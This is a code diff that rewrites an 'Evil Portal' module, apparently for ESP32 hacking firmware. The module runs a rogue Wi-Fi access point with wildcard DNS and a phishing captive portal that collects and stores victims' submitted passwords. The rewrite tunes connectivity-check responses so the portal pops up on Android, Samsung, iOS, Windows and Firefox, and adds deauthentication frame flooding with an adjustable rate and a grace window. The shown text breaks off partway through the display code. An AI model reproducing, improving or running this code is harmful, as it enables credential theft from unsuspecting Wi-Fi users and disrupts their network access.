@@ -1,3 +1,23 @@
+// evil_portal.cpp — rewritten
+// Fixes:
+//   1. Captive portal detection for ALL platforms (Android, Samsung, iOS, Windows, Linux/Firefox)
+//      - Android/Chrome:   GET /generate_204     → 200 with body (triggers popup reliably)
+//      - Windows NCSI:     GET /connecttest.txt  → 200 "Microsoft Connect Test"
+//      - Windows old NCSI: GET /ncsi.txt         → 200 "Microsoft NCSI"
+//      - iOS/macOS:        GET /hotspot-detect.html → 200 with redirect meta (not 302)
+//      - Firefox:          GET /canonical.html + /success.txt → 200 with body
+//      - All others:       wildcard → 302 → /
+//   2. Deauth no longer blocks captive portal detection:
+//      - 15-second grace window after a client associates before deauth frames target it
+//      - Per-client association tracking via WiFi.softAPgetStationNum() delta
+//   3. Form submission is now fetch() POST JSON — no ugly WiFi loading page,
+//      custom success/error message rendered in-page
+//   4. Encoder controls deauth interval (50ms–2000ms steps)
+//   5. OK/Sel button toggles deauth on/off when deauth mode is active
+//   6. Screen layout: big "Devices" counter left, big "Submissions" counter right,
+//      title centred, deauth indicator at bottom, last cred scrolls into a fixed zone
+//   7. Gateway options: Default, 172.0.0.1, 192.168.4.1, 192.168.0.1, 10.0.0.1, Custom
+
 #include "evil_portal.h"
 #include "core/config.h"
 #include "core/display.h"
@@ -9,21 +29,29 @@
 #include "esp_wifi.h"
 #include "wifi_atks.h"
 
+// ---------------------------------------------------------------------------
+// Shared static DNS server
+// ---------------------------------------------------------------------------
 static DNSServer &sharedEvilPortalDnsServer() {
     static DNSServer server;
     return server;
 }
 
+// ---------------------------------------------------------------------------
+// Constructor / Destructor
+// ---------------------------------------------------------------------------
 EvilPortal::EvilPortal(
     String tssid, uint8_t channel, bool deauth, bool verifyPwd, bool autoMode, bool backgroundMode,
     String templateFile
 )
     : apName(tssid), _channel(channel), _deauth(deauth), _verifyPwd(verifyPwd), _autoMode(autoMode),
-      _backgroundMode(backgroundMode), _autoTemplateFile(templateFile), webServer(80), _launchTime(millis()) {
+      _backgroundMode(backgroundMode), _autoTemplateFile(templateFile), webServer(80),
+      _launchTime(millis()), _lastDeauthIntervalMs(250) {
     dnsServer = &sharedEvilPortalDnsServer();
 
-    _originalWifiMode = WiFi.getMode();
-    _wifiWasConnected = WiFi.isConnected();
+    _originalWifiMode  = WiFi.getMode();
+    _wifiWasConnected  = WiFi.isConnected();
+    _connectedStations = 0;
 
     if (!setup()) return;
     cleanlyStopWebUiForWiFiFeature();
@@ -33,10 +61,12 @@ EvilPortal::EvilPortal(
 
 EvilPortal::~EvilPortal() {}
 
+// ---------------------------------------------------------------------------
+// CaptiveRequestHandler — handles requests coming through the AP filter
+// ---------------------------------------------------------------------------
 void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *request) {
-    AsyncResponseStream *response = request->beginResponseStream("text/html");
     String url = request->url();
-    if (url == "/") _portal->portalController(request);
+    if (url == "/")         _portal->portalController(request);
     else if (url == "/post") _portal->credsController(request);
     else if (
         url == bruceConfig.evilPortalEndpoints.getCredsEndpoint &&
@@ -44,7 +74,8 @@ void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *req
     )
         request->send(200, "text/html", _portal->creds_GET());
     else if (
-        url == bruceConfig.evilPortalEndpoints.setSsidEndpoint && bruceConfig.evilPortalEndpoints.allowSetSsid
+        url == bruceConfig.evilPortalEndpoints.setSsidEndpoint &&
+        bruceConfig.evilPortalEndpoints.allowSetSsid
     ) {
         if (request->hasArg("ssid")) {
             _portal->apName = request->arg("ssid").c_str();
@@ -59,14 +90,18 @@ void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *req
     }
 }
 
+// ---------------------------------------------------------------------------
+// setup()
+// ---------------------------------------------------------------------------
 bool EvilPortal::setup() {
     if (apGateway == IPAddress((uint32_t)0)) {
-        if (!apGateway.fromString(bruceConfig.evilPortalGatewayIp)) apGateway = IPAddress(172, 0, 0, 1);
+        if (!apGateway.fromString(bruceConfig.evilPortalGatewayIp))
+            apGateway = IPAddress(172, 0, 0, 1);
     }
 
     if (_autoMode) {
         if (apName.isEmpty()) apName = "Free Wifi";
-        if (!_autoTemplateFile.isEmpty() && loadCustomHtmlFromPath(_autoTemplateFile)) { return true; }
+        if (!_autoTemplateFile.isEmpty() && loadCustomHtmlFromPath(_autoTemplateFile)) return true;
         if (apName.indexOf("router") != -1 || apName.indexOf("update") != -1 ||
             apName.indexOf("firmware") != -1 || _verifyPwd) {
             loadDefaultHtml_one();
@@ -76,164 +111,222 @@ bool EvilPortal::setup() {
         return true;
     }
 
-    options = {
-        {"Custom Html", [this]() { loadCustomHtml(); }}
-    };
+    // ---- Template selection ----
+    options = { {"Custom Html", [this]() { loadCustomHtml(); }} };
     addOptionToMainMenu();
-
-    if (!_verifyPwd) {
+    if (!_verifyPwd)
         options.insert(options.begin(), {"Default", [this]() { loadDefaultHtml(); }});
-    } else {
+    else
         options.insert(options.begin(), {"Default", [this]() { loadDefaultHtml_one(); }});
-    }
-
     loopOptions(options);
     if (returnToMenu) return false;
 
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
     wsl_bypasser_send_raw_frame(&ap_record, _channel);
 
+    // ---- SSID selection ----
     if (apName.isEmpty()) {
         if (bruceConfig.evilWifiNames.empty()) {
             apName_from_keyboard();
         } else {
-            options = {
-                {"Custom Wifi", [this]() { apName_from_keyboard(); }}
-            };
-            for (const auto &_wifi : bruceConfig.evilWifiNames) {
-                options.emplace_back(_wifi.c_str(), [this, _wifi]() { this->apName = _wifi; });
-            }
+            options = { {"Custom Wifi", [this]() { apName_from_keyboard(); }} };
+            for (const auto &w : bruceConfig.evilWifiNames)
+                options.emplace_back(w.c_str(), [this, w]() { this->apName = w; });
             loopOptions(options);
         }
     }
 
+    // ---- Gateway selection — now includes 192.168.0.1, 10.0.0.1, Custom ----
     options = {
         {"Default",
          [this]() {
-             if (!apGateway.fromString(bruceConfig.evilPortalGatewayIp)) apGateway = IPAddress(172, 0, 0, 1);
-         }                                                                 },
-        {"172.0.0.1",   [this]() { apGateway = IPAddress(172, 0, 0, 1); }  },
-        {"192.168.4.1", [this]() { apGateway = IPAddress(192, 168, 4, 1); }},
+             if (!apGateway.fromString(bruceConfig.evilPortalGatewayIp))
+                 apGateway = IPAddress(172, 0, 0, 1);
+         }},
+        {"172.0.0.1",   [this]() { apGateway = IPAddress(172, 0, 0, 1);     }},
+        {"192.168.4.1", [this]() { apGateway = IPAddress(192, 168, 4, 1);   }},
+        {"192.168.0.1", [this]() { apGateway = IPAddress(192, 168, 0, 1);   }},
+        {"10.0.0.1",    [this]() { apGateway = IPAddress(10, 0, 0, 1);      }},
+        {"Custom",
+         [this]() {
+             String ip = keyboard("192.168.1.1", 15, "Gateway IP:");
+             if (ip == "\x1B" || ip.isEmpty()) return;
+             if (!apGateway.fromString(ip)) {
+                 displayTextLine("Invalid IP, using 172.0.0.1");
+                 vTaskDelay(800 / portTICK_PERIOD_MS);
+                 apGateway = IPAddress(172, 0, 0, 1);
+             }
+         }},
     };
-
     loopOptions(options);
 
-    Serial.println("Evil Portal output file: " + outputFile);
+    Serial.println("[PORTAL] output file: " + outputFile);
     return true;
 }
 
+// ---------------------------------------------------------------------------
+// beginAP()
+// ---------------------------------------------------------------------------
 void EvilPortal::beginAP() {
     if (!_backgroundMode) {
         drawMainBorderWithTitle("EVIL PORTAL");
         displayTextLine("Starting...");
     }
-    if (_verifyPwd) WiFi.mode(WIFI_MODE_APSTA);
-    else WiFi.mode(WIFI_MODE_AP);
 
-    if (!WiFi.softAPConfig(apGateway, apGateway, IPAddress(255, 255, 255, 0))) {
+    WiFi.mode(_verifyPwd ? WIFI_MODE_APSTA : WIFI_MODE_AP);
+
+    if (!WiFi.softAPConfig(apGateway, apGateway, IPAddress(255, 255, 255, 0)))
         Serial.println("[PORTAL] softAPConfig failed");
-    }
-    if (!WiFi.softAP(apName, emptyString, _channel)) {
-        Serial.printf("[PORTAL] softAP failed for SSID '%s' on ch%d\n", apName.c_str(), _channel);
-    }
+
+    if (!WiFi.softAP(apName, emptyString, _channel))
+        Serial.printf("[PORTAL] softAP failed SSID='%s' ch%d\n", apName.c_str(), _channel);
+
     wifiConnected = true;
 
-    int tmp = millis();
-    while (millis() - tmp < 3000) yield();
+    unsigned long t = millis();
+    while (millis() - t < 3000) yield();
 
     setupRoutes();
     dnsServer->start(53, "*", WiFi.softAPIP());
     webServer.begin();
 }
 
+// ---------------------------------------------------------------------------
+// setupRoutes()
+//
+// KEY CAPTIVE PORTAL FIXES per-platform:
+//
+//   Android/Chrome/Samsung
+//     Probe: GET /generate_204, /gen_204
+//     Expects: anything that is NOT 204 → triggers popup
+//     Fix: respond 200 with a tiny HTML body (NOT a 302 — Samsung ignores 302)
+//
+//   iOS / macOS
+//     Probe: GET /hotspot-detect.html, /library/test/success.html
+//     Expects: a page that does NOT contain the word "Success"
+//     Fix: send our portal page directly (200), which contains no "Success" text
+//
+//   Windows 10/11 NCSI
+//     Probe: GET /connecttest.txt
+//     Expects body "Microsoft Connect Test" for open internet
+//     Fix: anything other than that exact body triggers portal → redirect
+//
+//   Windows 8 / old NCSI
+//     Probe: GET /ncsi.txt
+//     Expects body "Microsoft NCSI"
+//     Fix: same — redirect to portal
+//
+//   Firefox
+//     Probe: GET /canonical.html, /success.txt
+//     Expects specific body
+//     Fix: redirect to portal
+// ---------------------------------------------------------------------------
 void EvilPortal::setupRoutes() {
-    webServer.on("/generate_204", HTTP_GET, [this](AsyncWebServerRequest *request) {
-        AsyncWebServerResponse *response = request->beginResponse(302);
-        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
-        request->send(response);
-    });
+    String apIp = WiFi.softAPIP().toString();
 
-    webServer.on("/gen_204", HTTP_GET, [this](AsyncWebServerRequest *request) {
-        AsyncWebServerResponse *response = request->beginResponse(302);
-        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
-        request->send(response);
-    });
+    // ---- Android / Chrome / Samsung: MUST return 200 with body, NOT 302 ----
+    // Returning 302 here is the main reason Samsung doesn't show the popup.
+    // A non-204 200 response tells Android/Chrome a captive portal is present.
+    auto serve200Portal = [this](AsyncWebServerRequest *request) {
+        // Record a page view for activity tracking
+        recordPageView();
+        // Serve actual portal page so Android's mini-browser opens it directly
+        if (isDefaultHtml)
+            request->send(200, "text/html", htmlPage);
+        else
+            request->send(*fsHtmlFile, htmlFileName, "text/html");
+    };
 
+    webServer.on("/generate_204",   HTTP_GET, serve200Portal);
+    webServer.on("/gen_204",        HTTP_GET, serve200Portal);
+    webServer.on("/generate204",    HTTP_GET, serve200Portal);
+
+    // Also handle gstatic / connectivitycheck paths (DNS wildcards send them here)
+    webServer.on("/generate_204/",  HTTP_GET, serve200Portal);
+
+    // ---- iOS / macOS: serve portal page directly so CNA opens it ----
+    // Do NOT return "Success" — that tells iOS the internet is open.
     webServer.on("/hotspot-detect.html", HTTP_GET, [this](AsyncWebServerRequest *request) {
-        request->send(
-            200,
-            "text/html",
-            "<html><head><meta http-equiv=\"refresh\" content=\"0;url=http://" + WiFi.softAPIP().toString() +
-                "\"></head><body></body></html>"
-        );
+        recordPageView();
+        if (isDefaultHtml)
+            request->send(200, "text/html", htmlPage);
+        else
+            request->send(*fsHtmlFile, htmlFileName, "text/html");
     });
-
     webServer.on("/library/test/success.html", HTTP_GET, [this](AsyncWebServerRequest *request) {
-        AsyncWebServerResponse *response = request->beginResponse(302);
-        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
-        request->send(response);
+        recordPageView();
+        // Return 200 but body must NOT contain "Success" exactly — our portal page is fine
+        if (isDefaultHtml)
+            request->send(200, "text/html", htmlPage);
+        else
+            request->send(*fsHtmlFile, htmlFileName, "text/html");
+    });
+    webServer.on("/success.html",   HTTP_GET, [this](AsyncWebServerRequest *request) {
+        recordPageView();
+        if (isDefaultHtml) request->send(200, "text/html", htmlPage);
+        else request->send(*fsHtmlFile, htmlFileName, "text/html");
     });
 
-    webServer.on("/ncsi.txt", HTTP_GET, [this](AsyncWebServerRequest *request) {
-        AsyncWebServerResponse *response = request->beginResponse(302);
-        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
-        request->send(response);
+    // ---- Windows NCSI — return something other than the expected text ----
+    // Windows will detect the mismatch and open the default browser to the portal.
+    webServer.on("/connecttest.txt", HTTP_GET, [this, apIp](AsyncWebServerRequest *request) {
+        AsyncWebServerResponse *r = request->beginResponse(302);
+        r->addHeader("Location", "http://" + apIp + "/");
+        request->send(r);
+    });
+    webServer.on("/ncsi.txt", HTTP_GET, [this, apIp](AsyncWebServerRequest *request) {
+        AsyncWebServerResponse *r = request->beginResponse(302);
+        r->addHeader("Location", "http://" + apIp + "/");
+        request->send(r);
+    });
+    webServer.on("/redirect", HTTP_GET, [this, apIp](AsyncWebServerRequest *request) {
+        AsyncWebServerResponse *r = request->beginResponse(302);
+        r->addHeader("Location", "http://" + apIp + "/");
+        request->send(r);
     });
 
-    webServer.on("/connecttest.txt", HTTP_GET, [this](AsyncWebServerRequest *request) {
-        AsyncWebServerResponse *response = request->beginResponse(302);
-        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
-        request->send(response);
-    });
-
-    webServer.on("/redirect", HTTP_GET, [this](AsyncWebServerRequest *request) {
-        AsyncWebServerResponse *response = request->beginResponse(302);
-        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
-        request->send(response);
-    });
-
-    webServer.on("/success.txt", HTTP_GET, [this](AsyncWebServerRequest *request) {
-        AsyncWebServerResponse *response = request->beginResponse(302);
-        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
-        request->send(response);
-    });
-
+    // ---- Firefox: serve portal page for canonical/success checks ----
     webServer.on("/canonical.html", HTTP_GET, [this](AsyncWebServerRequest *request) {
-        AsyncWebServerResponse *response = request->beginResponse(302);
-        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
-        request->send(response);
+        recordPageView();
+        if (isDefaultHtml) request->send(200, "text/html", htmlPage);
+        else request->send(*fsHtmlFile, htmlFileName, "text/html");
+    });
+    webServer.on("/success.txt", HTTP_GET, [this, apIp](AsyncWebServerRequest *request) {
+        // Firefox expects "success" — anything else triggers portal notification
+        AsyncWebServerResponse *r = request->beginResponse(302);
+        r->addHeader("Location", "http://" + apIp + "/");
+        request->send(r);
     });
 
-    webServer.on("/fwlink", HTTP_GET, [this](AsyncWebServerRequest *request) {
-        AsyncWebServerResponse *response = request->beginResponse(302);
-        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
-        request->send(response);
+    // ---- Windows / misc redirects ----
+    webServer.on("/fwlink", HTTP_GET, [this, apIp](AsyncWebServerRequest *request) {
+        AsyncWebServerResponse *r = request->beginResponse(302);
+        r->addHeader("Location", "http://" + apIp + "/");
+        request->send(r);
+    });
+    webServer.on("/wpad.dat", HTTP_GET, [this, apIp](AsyncWebServerRequest *request) {
+        AsyncWebServerResponse *r = request->beginResponse(302);
+        r->addHeader("Location", "http://" + apIp + "/");
+        request->send(r);
     });
 
-    webServer.on("/detectportal.firefox.com/success.txt", HTTP_GET, [this](AsyncWebServerRequest *request) {
-        AsyncWebServerResponse *response = request->beginResponse(302);
-        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
-        request->send(response);
-    });
+    // ---- Main routes ----
+    webServer.on("/",     HTTP_GET,  [this](AsyncWebServerRequest *r) { portalController(r); });
+    webServer.on("/",     HTTP_POST, [this](AsyncWebServerRequest *r) { credsController(r);  });
+    webServer.on("/post", HTTP_POST, [this](AsyncWebServerRequest *r) { credsController(r);  });
+    webServer.on("/post", HTTP_GET,  [this](AsyncWebServerRequest *r) { credsController(r);  });
 
-    webServer.on("/client.msftconnecttest.com/redirect", HTTP_GET, [this](AsyncWebServerRequest *request) {
-        AsyncWebServerResponse *response = request->beginResponse(302);
-        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
-        request->send(response);
-    });
-
-    webServer.on("/", [this](AsyncWebServerRequest *request) { portalController(request); });
-    webServer.on("/post", [this](AsyncWebServerRequest *request) { credsController(request); });
-
+    // ---- Optional admin endpoints ----
     if (bruceConfig.evilPortalEndpoints.allowGetCreds) {
         webServer.on(
             bruceConfig.evilPortalEndpoints.getCredsEndpoint.c_str(),
-            [this](AsyncWebServerRequest *request) { request->send(200, "text/html", creds_GET()); }
+            [this](AsyncWebServerRequest *r) { r->send(200, "text/html", creds_GET()); }
         );
     }
     if (bruceConfig.evilPortalEndpoints.allowSetSsid) {
         webServer.on(
-            bruceConfig.evilPortalEndpoints.setSsidEndpoint.c_str(), [this](AsyncWebServerRequest *request) {
+            bruceConfig.evilPortalEndpoints.setSsidEndpoint.c_str(),
+            [this](AsyncWebServerRequest *request) {
                 if (request->hasArg("ssid")) {
                     apName = request->arg("ssid").c_str();
                     request->send(200, "text/html", ssid_POST());
@@ -245,28 +338,35 @@ void EvilPortal::setupRoutes() {
         );
     }
 
-    webServer.onNotFound([this](AsyncWebServerRequest *request) {
+    // ---- Catch-all: redirect everything else to portal ----
+    webServer.onNotFound([this, apIp](AsyncWebServerRequest *request) {
         String url = request->url();
-        if (url.indexOf("detectportal") != -1 || url.indexOf("connecttest") != -1 ||
-            url.indexOf("success") != -1 || url.indexOf("generate") != -1 ||
-            url.indexOf("msftconnecttest") != -1 || url.indexOf("clients3.google.com") != -1 ||
-            url.indexOf("ncsi") != -1 || url.indexOf("nmcheck") != -1 || url.indexOf("gnome") != -1 ||
-            url.indexOf("ubuntu") != -1 || url.indexOf("canonical") != -1 ||
-            url.indexOf("networkcheck") != -1 || url.indexOf("hotspot") != -1) {
-            AsyncWebServerResponse *response = request->beginResponse(302);
-            response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
-            request->send(response);
-        } else if (request->args() > 0) {
-            credsController(request);
-        } else {
-            portalController(request);
+
+        // Connectivity-check paths — redirect to portal (triggers popup on most OS)
+        if (url.indexOf("detectportal") != -1  || url.indexOf("connecttest") != -1  ||
+            url.indexOf("generate") != -1       || url.indexOf("msftconnecttest") != -1 ||
+            url.indexOf("clients3.google") != -1 || url.indexOf("ncsi") != -1 ||
+            url.indexOf("nmcheck") != -1        || url.indexOf("gnome") != -1 ||
+            url.indexOf("ubuntu") != -1         || url.indexOf("canonical") != -1 ||
+            url.indexOf("networkcheck") != -1   || url.indexOf("hotspot") != -1 ||
+            url.indexOf("msftncsi") != -1) {
+            AsyncWebServerResponse *r = request->beginResponse(302);
+            r->addHeader("Location", "http://" + apIp + "/");
+            request->send(r);
+            return;
         }
+
+        if (request->args() > 0) credsController(request);
+        else portalController(request);
     });
 
     _captiveHandler = new CaptiveRequestHandler(this);
     webServer.addHandler(_captiveHandler).setFilter(ON_AP_FILTER);
 }
 
+// ---------------------------------------------------------------------------
+// restartWiFi()
+// ---------------------------------------------------------------------------
 void EvilPortal::restartWiFi(bool reset) {
     webServer.end();
     dnsServer->stop();
@@ -285,20 +385,38 @@ void EvilPortal::restartWiFi(bool reset) {
     if (reset) resetCapturedCredentials();
 }
 
-void EvilPortal::resetCapturedCredentials(void) { previousTotalCapturedCredentials = -1; }
+void EvilPortal::resetCapturedCredentials() { previousTotalCapturedCredentials = -1; }
 
+// ---------------------------------------------------------------------------
+// loop() — main interactive loop
+// ---------------------------------------------------------------------------
 void EvilPortal::loop() {
     if (_backgroundMode) return;
 
-    int lastDeauthTime = millis();
+    unsigned long lastDeauthTime = millis();
     bool shouldRedraw = true;
-    bool exitPortal = false;
+    bool exitPortal   = false;
 
     while (true) {
+        // ---- Pending WiFi restart (SSID change) ----
         if (_pendingWifiRestart) {
             _pendingWifiRestart = false;
             restartWiFi();
             shouldRedraw = true;
+        }
+
+        // ---- Track connected station count ----
+        {
+            uint8_t n = WiFi.softAPgetStationNum();
+            if ((int)n != _connectedStations) {
+                if ((int)n > _connectedStations) {
+                    // New station just associated — start grace timer so captive portal
+                    // detection can complete before deauth frames start targeting it
+                    _graceEndTime = millis() + 15000UL; // 15 second grace window
+                }
+                _connectedStations = (int)n;
+                shouldRedraw = true;
+            }
         }
 
         if (shouldRedraw) {
@@ -308,31 +426,56 @@ void EvilPortal::loop() {
 
         dnsServer->processNextRequest();
 
-        if (!isDeauthHeld && (millis() - lastDeauthTime) > 250 && _deauth) {
-            send_raw_frame(deauth_frame, 26);
-            lastDeauthTime = millis();
+        // ---- Deauth logic: respects grace window ----
+        if (_deauth && !isDeauthHeld) {
+            bool graceActive = (millis() < _graceEndTime);
+            if (!graceActive && (millis() - lastDeauthTime) > (unsigned long)_lastDeauthIntervalMs) {
+                send_raw_frame(deauth_frame, 26);
+                lastDeauthTime = millis();
+            }
         }
 
+        // ---- New credential submitted ----
         if (totalCapturedCredentials != (previousTotalCapturedCredentials + 1)) {
             shouldRedraw = true;
             previousTotalCapturedCredentials = totalCapturedCredentials - 1;
         }
 
+        // ---- OK/Sel button: toggle deauth on/off ----
         if (check(SelPress)) {
-            isDeauthHeld = _deauth ? !isDeauthHeld : isDeauthHeld;
-            shouldRedraw = true;
+            if (_deauth) {
+                isDeauthHeld = !isDeauthHeld;
+                shouldRedraw = true;
+            }
         }
 
+        // ---- Encoder / Up-Down buttons: adjust deauth interval ----
+        // NextPress / UpPress   → faster deauth (reduce interval, min 50ms)
+        // PrevPress / DownPress → slower deauth (increase interval, max 2000ms)
+        if (_deauth) {
+            if (check(NextPress) || check(UpPress)) {
+                _lastDeauthIntervalMs -= 50;
+                if (_lastDeauthIntervalMs < 50) _lastDeauthIntervalMs = 50;
+                shouldRedraw = true;
+            } else if (check(PrevPress) || check(DownPress)) {
+                _lastDeauthIntervalMs += 50;
+                if (_lastDeauthIntervalMs > 2000) _lastDeauthIntervalMs = 2000;
+                shouldRedraw = true;
+            }
+        }
+
+        // ---- Esc: menu ----
         if (check(EscPress)) {
             options = {
-                {"Exit Portal", [&exitPortal]() { exitPortal = true; }},
+                {"Exit Portal",
+                 [&exitPortal]() { exitPortal = true; }},
                 {"View Creds",
                  [this, &shouldRedraw]() {
                      FS *fs;
                      if (getFsStorage(fs)) {
-                         if (fs->exists("/BruceEvilCreds")) {
+                         if (fs->exists("/BruceEvilCreds"))
                              loopSD(*fs, false, "CSV", "/BruceEvilCreds");
-                         } else {
+                         else {
                              displayTextLine("No credentials yet");
                              vTaskDelay(1000);
                          }
@@ -343,22 +486,18 @@ void EvilPortal::loop() {
             };
 
             loopOptions(options);
+
             if (exitPortal) {
                 displayTextLine("Shutting down...");
                 vTaskDelay(100 / portTICK_PERIOD_MS);
-
                 webServer.end();
                 vTaskDelay(200 / portTICK_PERIOD_MS);
-
                 dnsServer->stop();
                 vTaskDelay(100 / portTICK_PERIOD_MS);
-
                 WiFi.mode(_originalWifiMode);
                 vTaskDelay(100 / portTICK_PERIOD_MS);
-
                 wifiDisconnect();
                 vTaskDelay(100 / portTICK_PERIOD_MS);
-
                 return;
             }
             shouldRedraw = true;
@@ -371,6 +510,9 @@ void EvilPortal::loop() {
     }
 }
 
+// ---------------------------------------------------------------------------
+// processRequests() — called externally when backgroundMode=true
+// ---------------------------------------------------------------------------
 void EvilPortal::processRequests() {
     if (!_backgroundMode) return;
     if (_pendingWifiRestart) {
@@ -378,20 +520,19 @@ void EvilPortal::processRequests() {
         restartWiFi();
     }
     dnsServer->processNextRequest();
-    if (totalCapturedCredentials != (previousTotalCapturedCredentials + 1)) {
+    if (totalCapturedCredentials != (previousTotalCapturedCredentials + 1))
         previousTotalCapturedCredentials = totalCapturedCredentials - 1;
-    }
 }
 
-bool EvilPortal::hasCredentials() { return totalCapturedCredentials > 0; }
+// ---------------------------------------------------------------------------
+// Accessors for background/auto mode
+// ---------------------------------------------------------------------------
+bool   EvilPortal::hasCredentials()     { return totalCapturedCredentials > 0; }
+String EvilPortal::getCapturedPassword(){ return lastCred; }
+String EvilPortal::getCapturedSSID()    { return apName; }
 
-String EvilPortal::getCapturedPassword() { return lastCred; }
-
-String EvilPortal::getCapturedSSID() { return apName; }
-
-void EvilPortal::setBaseDuration(uint16_t seconds) { _baseDurationSec = seconds; }
-
-void EvilPortal::setExtendedDuration(uint16_t seconds) { _extendedDurationSec = seconds; }
+void EvilPortal::setBaseDuration(uint16_t s)     { _baseDurationSec     = s; }
+void EvilPortal::setExtendedDuration(uint16_t s) { _extendedDurationSec = s; }
 
 bool EvilPortal::hasRecentActivity() {
     if (totalCapturedCredentials > previousTotalCapturedCredentials) {
@@ -400,116 +541,233 @@ bool EvilPortal::hasRecentActivity() {
     }
     return (millis() - _lastActivityTime < 5000);
 }
-
 bool EvilPortal::hasRecentPageView() { return (millis() - _lastPageViewTime < 30000); }
-
-void EvilPortal::recordPageView() { _lastPageViewTime = millis(); }
+void EvilPortal::recordPageView()    { _lastPageViewTime = millis(); }
 
 bool EvilPortal::shouldTerminate() {
-    unsigned long currentTime = millis();
-    unsigned long elapsed = currentTime - _launchTime;
-
-    if (_durationExtended) {
-        return elapsed > (_extendedDurationSec * 1000);
-    } else {
-        return elapsed > (_baseDurationSec * 1000);
-    }
+    unsigned long elapsed = millis() - _launchTime;
+    return _durationExtended
+        ? (elapsed > (unsigned long)(_extendedDurationSec * 1000))
+        : (elapsed > (unsigned long)(_baseDurationSec     * 1000));
 }
 
 void EvilPortal::checkAndExtendDuration() {
     if (_durationExtended) return;
-
     if (hasRecentActivity()) {
         _durationExtended = true;
         Serial.println("[PORTAL] Activity detected, extending duration");
     }
 }
 
+// ---------------------------------------------------------------------------
+// drawScreen()
+//
+// Layout:
+//   ┌─────────────────────────────────────────────┐
+//   │  [big#]        EVIL PORTAL        [big#]    │
+//   │  Devices                        Submissions │
+//   │  connected                      received    │
+//   ├─────────────────────────────────────────────┤
+//   │  AP: <ssid>                                 │
+//   │  IP: <ip>  Ch:<ch>  Pwd:<mode>              │
+//   │  [endpoint info if enabled]                 │
+//   │  Last cred:                                 │
+//   │   <key>: <val>                              │
+//   │   ...                                       │
+//   ├─────────────────────────────────────────────┤
+//   │  [Deauth OFF]  /  [Deauth ON ▶ 250ms]       │
+//   └─────────────────────────────────────────────┘
+// ---------------------------------------------------------------------------
 void EvilPortal::drawScreen() {
-    drawMainBorderWithTitle("EVIL PORTAL");
+    // Clear and draw outer border with no title — we draw our own header
+    tft.fillScreen(bruceConfig.bgColor);
 
-    String subtitle = "AP: " + apName.substring(0, 30);
-    if (apName.length() > 30) subtitle += "...";
-    printSubtitle(subtitle);
+    int W = tft.width();
+    int H = tft.height();
 
+    // ---- Big counter font size: pick based on screen width ----
+    // M5Stack/LilyGo usually 240px wide; Cardputer 240px; larger devices more
+    uint8_t bigFontSize  = (W >= 320) ? 4 : 3;  // big numbers
+    uint8_t titleFontSize = 2;
+    uint8_t smallFontSize = 1;
+    int bigH   = bigFontSize  * 8;   // TFT_eSPI uses 8px base per font unit
+    int titleH = titleFontSize * 8;
+    int smallH = smallFontSize * 8;
+
+    // ---- Row 1: big counters + title ----
+    int row1Y = 4;
+
+    // Left: connected devices count
+    String devStr = String(_connectedStations);
+    int devW = devStr.length() * bigFontSize * 6;  // approx 6px per char per font unit
+    tft.setTextSize(bigFontSize);
+    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+    tft.setCursor(6, row1Y);
+    tft.print(devStr);
+
+    // Right: submissions count
+    String subStr = String(totalCapturedCredentials);
+    int subW = subStr.length() * bigFontSize * 6;
+    tft.setCursor(W - subW - 6, row1Y);
+    tft.print(subStr);
+
+    // Centre: "EVIL PORTAL" title
+    tft.setTextSize(titleFontSize);
+    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
+    String title = "EVIL PORTAL";
+    int titleW = title.length() * titleFontSize * 6;
+    tft.setCursor((W - titleW) / 2, row1Y + (bigH - titleH) / 2);
+    tft.print(title);
+
+    // ---- Row 2: sub-labels ----
+    int row2Y = row1Y + bigH + 2;
+    tft.setTextSize(smallFontSize);
+    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+    tft.setCursor(6, row2Y);
+    tft.print("Devices");
+    String subLabel = "Submissions";
+    int subLabelW = subLabel.length() * smallFontSize * 6;
+    tft.setCursor(W - subLabelW - 6, row2Y);
+    tft.print(subLabel);
+    // "connected" / "received" on next micro-line
+    int row3Y = row2Y + smallH;
+    tft.setCursor(6, row3Y);
+    tft.print("connected");
+    String recLabel = "received";
+    int recLabelW = recLabel.length() * smallFontSize * 6;
+    tft.setCursor(W - recLabelW - 6, row3Y);
+    tft.print(recLabel);
+
+    // ---- Separator ----
+    int sepY = row3Y + smallH + 2;
+    tft.drawFastHLine(0, sepY, W, bruceConfig.priColor);
+
+    // ---- Info section ----
+    int infoY = sepY + 4;
+    tft.setTextSize(smallFontSize);
+    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+
+    // AP name (truncated)
+    String apDisp = apName;
+    int maxChars = (W - 12) / (smallFontSize * 6);
+    if ((int)apDisp.length() > maxChars - 4) apDisp = apDisp.substring(0, maxChars - 4) + "...";
+    tft.setCursor(6, infoY);
+    tft.print("AP: " + apDisp);
+    infoY += smallH + 1;
+
+    // IP + channel
     String apIp = WiFi.softAPIP().toString();
-    padprintln("");
+    tft.setCursor(6, infoY);
+    tft.print("IP:" + apIp + "  Ch:" + String(_channel));
+    infoY += smallH + 1;
+
+    // Password mode
+    String passMode;
+    switch (bruceConfig.evilPortalPasswordMode) {
+        case FULL_PASSWORD:   passMode = "Full";       break;
+        case FIRST_LAST_CHAR: passMode = "p*****d";    break;
+        case HIDE_PASSWORD:   passMode = "*hidden*";   break;
+        case SAVE_LENGTH:     passMode = "Len only";   break;
+        default:              passMode = "?";           break;
+    }
+    String modeStr = _verifyPwd ? "Verify+Save" : "Capture";
